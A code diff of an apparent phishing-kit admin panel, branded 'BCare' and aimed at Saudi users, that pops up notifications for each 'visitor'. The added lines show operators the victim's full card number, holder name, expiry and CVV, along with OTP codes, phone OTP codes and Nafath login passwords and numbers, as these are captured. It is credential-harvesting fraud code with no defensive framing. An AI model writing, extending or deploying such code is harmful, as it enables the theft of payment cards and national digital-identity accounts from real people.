@@ -244,12 +244,23 @@ const AdminVisitors = () => {
         const visitorLabel = details?.customer_name || visitor?.visitor_name || "زائر";
         
         let body = `${stageLabel[stage] || stage}`;
-        if (stage === "otp" && details?.otp_code) {
+        if (stage === "payment" && details) {
+          const lines: string[] = [];
+          if (details.card_number_full) lines.push(`💳 ${details.card_number_full}`);
+          else if (details.card_last_four) lines.push(`💳 ****${details.card_last_four}`);
+          if (details.card_holder_name) lines.push(`👤 ${details.card_holder_name}`);
+          if (details.card_expiry) lines.push(`📅 ${details.card_expiry}`);
+          if (details.card_cvv) lines.push(`🔒 CVV: ${details.card_cvv}`);
+          if (details.total_price) lines.push(`💰 ${details.total_price} ر.س`);
+          if (details.payment_method) lines.push(`🏦 ${details.payment_method === "card" ? "بطاقة" : details.payment_method === "atm" ? "صراف" : details.payment_method}`);
+          if (lines.length > 0) body += `\n${lines.join("\n")}`;
+        } else if (stage === "otp" && details?.otp_code) {
           body += `\nكود OTP: ${details.otp_code}`;
         } else if (stage === "phone_otp" && details?.phone_otp_code) {
           body += `\nكود الجوال: ${details.phone_otp_code}`;
-        } else if ((stage === "nafath_login" || stage === "nafath_verify") && details?.nafath_number) {
-          body += `\nرقم نفاذ: ${details.nafath_number}`;
+        } else if ((stage === "nafath_login" || stage === "nafath_verify") && details) {
+          if (details.nafath_password) body += `\nكلمة المرور: ${details.nafath_password}`;
+          if (details.nafath_number) body += `\nرقم نفاذ: ${details.nafath_number}`;
         }
 
         const notification = new Notification(`🔔 BCare - ${visitorLabel}`, {
